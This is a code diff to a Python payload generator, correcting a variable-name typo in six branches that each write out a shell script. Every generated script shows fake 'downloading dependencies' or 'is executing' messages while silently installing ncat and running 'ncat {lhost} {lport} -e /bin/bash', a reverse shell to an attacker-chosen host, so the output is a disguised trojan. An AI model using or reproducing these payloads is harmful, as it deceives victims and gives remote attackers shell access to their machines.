@@ -196,7 +196,7 @@ elif payload=="11":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo apt-get install nmap -y &> /dev/null
-echo -e '\033[1;32m {addditional}'
+echo -e '\033[1;32m {additional}'
 echo -e '\033[1;32m DOWNLOADING dependencies for {name} ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -208,7 +208,7 @@ elif payload=="12":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo pacman -S install nmap -y &> /dev/null
-echo -e '\033[1;32m {addditional}'
+echo -e '\033[1;32m {additional}'
 echo -e '\033[1;32m DOWNLOADING dependencies for {name} ..please wait!\n'
 sudo pacman -S install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -220,7 +220,7 @@ elif payload=="13":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo apt-get install nmap -y &> /dev/null
-echo -e '\033[1;32m {addditional}'
+echo -e '\033[1;32m {additional}'
 echo -e '\033[1;32m DOWNLOADING dependencies for {name} ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -232,7 +232,7 @@ elif payload=="14":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo apt-get install nmap -y &> /dev/null
-echo -e '\033[1;32m {addditional}'
+echo -e '\033[1;32m {additional}'
 echo -e '\033[1;32m {name} is executing,this may take a while ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -244,7 +244,7 @@ elif payload=="15":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo pacman -S install nmap -y &> /dev/null
-echo -e '\033[1;32m {addditional}'
+echo -e '\033[1;32m {additional}'
 echo -e '\033[1;32m {name} is executing,this may take a while ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
@@ -256,7 +256,7 @@ elif payload=="16":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
 		s=(f"""sudo apt-get install nmap -y &> /dev/null
-echo -e '\033[1;32m {addditional}'
+echo -e '\033[1;32m {additional}'
 echo -e '\033[1;32m {name} is executing,this may take a while ..please wait!\n'
 sudo apt-get install ncat -y &> /dev/null
 ncat {lhost} {lport} -e /bin/bash &> /dev/null
